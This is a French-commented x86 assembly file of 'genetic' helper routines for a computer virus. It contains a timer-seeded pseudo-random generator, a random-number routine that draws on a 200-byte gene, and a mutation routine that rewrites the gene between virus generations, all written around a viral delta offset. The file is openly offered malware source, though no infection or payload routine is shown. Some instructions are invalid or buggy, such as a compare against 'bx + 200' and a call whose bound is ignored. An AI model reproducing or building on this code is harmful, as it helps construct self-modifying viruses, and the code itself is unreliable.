; <<<<<Routines Génétiques>>>>>
;
; (pour toutes ces routines, bp est supposé contenir le delta offset)
;
; --- Get_Random ---
; la routine Get_Random s'utilisent de façon analogue i.e.
; entrée :
;    ax = plafond max
; sortie :
;    ax = nombre aléatoire compris entre 0 et (plafond max-1)
;

Get_Random:
    push bx                                 ;
    push cx                                 ;
    push dx                                 ;

    push ax                                 ;
    mov bx,[bp + Gene_ptr]                  ;on met le pointeur dans bx
    mov ax,[bx]                             ;ax contient le nouveau nombre
    add word ptr [bp + Gene_ptr],2          ;on incrémente le pointeur
    mov bx,offset Gene                      ;
    add bx,bp                               ;
    cmp word ptr [bp + Gene_ptr],bx + 200   ;est-il à la fin du gène ?
    jne End_Rand                            ;non, on continue
    mov word ptr [bp + Gene_ptr],bx         ;oui, on le remet au début

  End_Rand:

    pop cx                                  ;on fait le mod
    xor dx,dx                               ;
    div cx                                  ;
    mov ax,dx                               ;voilà, la bonne valeur est dans ax

    pop dx                                  ;
    pop cx                                  ;
    pop bx                                  ;
    ret                                     ;on renvoie tout ça


; --- Mutate ---
; C'est cette routine qui va changer le gène. On doit l'appeler de temps en temps.
; entrée
;    aucune
; sortie
;    le gène est modifié
;

Mutate:
    push cx                                 ;
    push ax                                 ;

    mov ax,20                               ;
    call Get_Rand                           ;on modifie 20 octets au maximum
    mov cx,ax                               ;

  Mutate_Loop:
    push bp                                 ;
    mov ax,200                              ;
    call Get_Rand                           ;où ?
    add bp,ax                               ;
    mov ax,0FFFFh                           ;
    call Get_Rand                           ;quoi ?
    mov [bp + Gene],al                      ;
    pop bp                                  ;
    loop Mutate_Loop                        ;

    pop ax                                  ;
    pop cx                                  ;
    ret



; --- Linear Congruential Pseudo-Random Number Generator ---
; le GNPA classique...
; X(n+1) = (A * X(n) + C) mod M
; entrée:
;     aucune
; sortie:
;     ax = nombre généré

Get_Rand:
    push cx
    push dx

    mov ax,[bp + Rand_Seed]
    mov cx,A
    mul cx
    add ax,C
    adc dx,0
    mov cx,M
    div cx
    mov ax,dx
    mov [bp + Rand_Seed],ax

    pop dx
    pop cx
    ret
        
M equ 43691
A equ 13
C equ 14449
Rand_Seed dw ?

Gene_ptr dw ?
Gene db 200 dup (?)

; --- Init_Gene ---
; Cette routine est appelée par le virus, elle sert uniquement à initialiser
; le gène. On ne doit l'appeler qu'une seule fois pour la première génération de virus.
; entrée
;   aucune
; sortie
;   le gène est prêt
;

Init_Gene:
    push es                                 ;
    push di                                 ;
    push ds                                 ;
    push si                                 ;
    push cx                                 ;
    push ax                                 ;

    xor ax,ax                               ;
    mov ds,ax                               ;
    mov si,046Ch                            ;
    lodsw                                   ;
    mov word ptr [bp + Rand_Seed],ax        ;on initialise le GNPA

    push cs                                 ;
    pop es                                  ;
    mov di,offset Gene                      ;
    add di,bp                               ;
    mov cx,200                              ;
  Gene_Loop:                                ;
    mov ax,0FFFFh                           ;
    call Get_Rand                           ;
    stosb                                   ;on rempli le gène avec al
    loop Gene_Loop                          ;
    mov ax,offset Gene                      ;
    add ax,bp                               ;
    mov word ptr [bp + Gene_ptr],ax         ;on initialise le pointeur
  End_init:                                 ;

    pop ax                                  ;
    pop cx                                  ;
    pop si                                  ;
    pop ds                                  ;
    pop di                                  ;
    pop es                                  ;
    ret